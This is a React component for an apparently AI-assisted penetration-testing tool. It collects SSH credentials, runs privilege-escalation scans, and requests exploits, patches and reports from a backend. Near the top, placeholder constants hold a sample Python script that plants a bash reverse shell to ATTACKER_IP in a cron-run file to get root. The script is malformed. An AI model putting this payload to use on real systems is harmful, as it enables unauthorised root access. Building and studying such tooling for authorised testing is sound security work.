import { useState, useContext, useEffect } from 'react'
import api from '../../utils/api'
import classNames from 'classnames'
import { AppContext } from '../../context/AppContext'

import styles from './styles.module.css'
import Markdown from 'react-markdown'

const details =
  '[*] Vulnerability Type: Insecure Cronn jobs\n\tDescription: Cron job allows attacker to launch /bin/sh as root\n\n[*] Vulnerability Type: Insecure file permissions\n\tDescription: Symlink to root process can be executed by non sudoer'

const code =
  '#!/usr/bin/python3\n\ncron_job_path = "/tmp/root_shell.sh"\n\npayload = """#!/bin/bash bash -i >&\n             /dev/tcp/ATTACKER_IP/ATTACKER_PORT \n             0>&1 """\n\n# Replace ATTACKER_IP and ATTACKER_PORT with your own IP and port attacker_ip = "192.168.1.100" \n# Change this to your attacker\'s IP attacker_port = "4444"  \n\n# Change this to the listening port on your machine# Create the payload with the attacker\'s IP and port \npayload = payload.replace("ATTACKER_IP", attacker_ip) \npayload = payload.replace("ATTACKER_PORT", attacker_port)  \n\n# Write the payload to the file that the cron job will execute\n\nwith open(cron_job_path, "w") as file: file.write(payload)  # Make the script executable\n\tos.chmod(cron_job_path, 0o755)  \nprint(f"[+] Exploit written to {cron_job_path}") print("[+] Waiting for the cron job to execute...")  '

const options = [
  'system_information',
  'container',
  'cloud',
  'procs_crons_timers_srvcs_sockets',
  'network_information',
  'users_information',
  'software_information',
  'interesting_perms_files',
  'interesting_files',
  'api_keys_regex'
]

const displayOptions = [
  'System Information',
  'Container',
  'Cloud',
  'Procs Crons Timers and Sockets',
  'Network Information',
  'Users Information',
  'Software Information',
  'File Permissions',
  'Interesting Files',
  'API Keys'
]

export default function PentesterMode() {
  const { appState, setAppState } = useContext(AppContext)

  const [host, setHost] = useState('')
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [checkedItem, setCheckedItem] = useState(-1)
  const [selectedVuln, setSelectedVuln] = useState(-1)
  const [loading, setLoading] = useState(false)

  const handleScanClick = async () => {
    setLoading(true)

    try {
      const response = await api.post(
        `${process.env.REACT_APP_BACKEND_URL}/pentest-scan/`,
        {
          host: host,
          username: username,
          password: password,
          option: options[checkedItem]
        },
        {
          headers: {
            'Content-Type': 'multipart/form-data'
          }
        }
      )

      setAppState({
        ...appState,
        pentest: {
          host: host,
          username: username,
          option: options[checkedItem],
          id: response.data.id,
          result: response.data.result
        },
        pentestExploit: {},
        pentestPatch: {}
      })
    } catch (e) {
      console.error('An error occurred.')
    } finally {
      setLoading(false)
    }
  }

  const handleExploitClick = async (index, id) => {
    setLoading(true)

    try {
      const response = await api.post(
        `${process.env.REACT_APP_BACKEND_URL}/pentest-exploit/`,
        { id },
        {
          headers: {
            'Content-Type': 'multipart/form-data'
          }
        }
      )

      setAppState({
        ...appState,
        pentestExploit: {
          ...(appState.pentestExploit || {}),
          [index]: response.data.result
        }
      })
    } catch (e) {
      console.error('An error occurred.')
      console.error(e)
    } finally {
      setLoading(false)
    }
  }

  const handlePatchClick = async (index, id) => {
    if (appState.pentestExploit[index] === undefined) {
      return
    }

    setLoading(true)

    try {
      const response = await api.post(
        `${process.env.REACT_APP_BACKEND_URL}/pentest-patch/`,
        { id },
        {
          headers: {
            'Content-Type': 'multipart/form-data'
          }
        }
      )

      setAppState({
        ...appState,
        pentestPatch: {
          ...(appState.pentestPatch || {}),
          [index]: response.data.result
        }
      })
    } catch (e) {
      console.error('An error occurred.')
    } finally {
      setLoading(false)
    }
  }

  const handleGenerateReport = id => {
    window.open(
      `${process.env.REACT_APP_BACKEND_URL}/get-pentest-report?id=${id}`,
      '_blank',
      'noopener,noreferrer'
    )
  }

  const dataParse = vuln => {
    return `Vulnerability Name: ${vuln.name}\n\nDescription: ${vuln.description}\n\nLocation: ${vuln.location}\n\nCVE: ${vuln.cve}`
  }

  useEffect(() => {
    if (appState.pentest) {
      setHost(appState.pentest.host)
      setUsername(appState.pentest.username)
      setCheckedItem(options.indexOf(appState.pentest.option))
    }
  }, [])

  return (
    <>
      <div className={styles.card}>
        <h2>Connection Panel</h2>
        <div>
          <input
            className={styles.connectionInput}
            name='host'
            placeholder='Host'
            value={host}
            onChange={e => setHost(e.target.value)}
          />
          <input
            className={styles.connectionInput}
            name='username'
            placeholder='SSH Username'
            value={username}
            onChange={e => setUsername(e.target.value)}
          />
          <input
            className={styles.connectionInput}
            name='password'
            type='password'
            placeholder='SSH Password'
            value={password}
            onChange={e => setPassword(e.target.value)}
            autoComplete='new-password'
          />
        </div>
      </div>
      <div style={{ height: '1rem' }}></div>
      <div className={styles.card}>
        <h2>Select Scan Options</h2>
        <div>
          {displayOptions.map((option, index) => (
            <div key={index} className={styles.checkboxContainer}>
              <input
                type='checkbox'
                id={`checkbox-${index}`}
                checked={index == checkedItem}
                onChange={() => setCheckedItem(index)}
                className={styles.checkboxInput}
              />
              <label
                htmlFor={`checkbox-${index}`}
                className={styles.checkboxLabel}
              >
                {option}
              </label>
            </div>
          ))}
          <button onClick={handleScanClick}>Connect & Scan</button>
        </div>
      </div>
      {loading && (
        <>
          <div style={{ height: '1rem' }}></div>
          <div className={classNames(styles.card)}>
            <div className={styles.loadingBar}>
              <div></div>
            </div>
          </div>
        </>
      )}
      {appState.pentest && (
        <>
          <div style={{ height: '1rem' }}></div>
          <div className={styles.card}>
            <h2>Vulnerabilities</h2>
            <div>
              {appState.pentest.result.map((vuln, index) => (
                <div
                  className={classNames(
                    styles.vulnListItem,
                    selectedVuln == index ? styles.selected : null
                  )}
                  onClick={() => setSelectedVuln(index)}
                >
                  <p>{vuln.name}</p>
                  {selectedVuln == index && (
                    <>
                      <button
                        onClick={() => handleExploitClick(index, vuln.id)}
                      >
                        Exploit
                      </button>
                      <button
                        className={classNames(
                          appState.pentestExploit[selectedVuln] === undefined
                            ? styles.buttonDisabled
                            : null
                        )}
                        onClick={() => handlePatchClick(index, vuln.id)}
                      >
                        Patch
                      </button>
                    </>
                  )}
                </div>
              ))}
            </div>
          </div>
          {selectedVuln !== -1 && (
            <>
              <div style={{ height: '1rem' }}></div>
              <div className={classNames(styles.card, styles.vulnDetails)}>
                <h2>Vulnerability Details</h2>
                <textarea
                  readOnly={true}
                  value={dataParse(appState.pentest.result[selectedVuln])}
                ></textarea>
              </div>
            </>
          )}
          {appState.pentestExploit[selectedVuln] !== undefined && (
            <>
              <div style={{ height: '1rem' }}></div>
              <div className={styles.card}>
                <h2>Exploit</h2>
                <div className={styles.markdownArea}>
                  <Markdown>
                    {appState.pentestExploit[selectedVuln].description}
                  </Markdown>
                </div>
              </div>
            </>
          )}
          {appState.pentestPatch[selectedVuln] !== undefined && (
            <>
              <div style={{ height: '1rem' }}></div>
              <div className={styles.card}>
                <h2>Patch</h2>
                <div className={styles.markdownArea}>
                  <Markdown>
                    {appState.pentestPatch[selectedVuln].description}
                  </Markdown>
                </div>
              </div>
            </>
          )}
          {appState.pentest && (
            <>
              <div style={{ height: '1rem' }}></div>
              <button onClick={() => handleGenerateReport(appState.pentest.id)}>
                Generate Report
              </button>
            </>
          )}
        </>
      )}
    </>
  )
}
